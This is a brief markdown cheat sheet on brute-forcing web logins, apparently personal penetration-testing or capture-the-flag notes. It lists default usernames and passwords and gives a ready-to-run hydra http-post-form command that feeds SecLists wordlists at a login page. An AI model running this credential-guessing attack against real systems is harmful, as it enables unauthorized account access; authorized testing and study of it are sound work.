# brute forcing

- Try the following usernames

```shell
admin
root
<software-name> (e.g. cms)
```

- Try the following passwords

```shell
root
password
```

- Brute force using most common credentials

```shell
cp /usr/share/seclists/Usernames/top-usernames-shortlist.txt users.txt
cp /usr/share/seclists/Passwords/darkweb2017-top100.txt passwords.txt
hydra -f -L users.txt -P passwords.txt $ip http-post-form "/login:username=^USER^&password=^PASS^:error message."
```
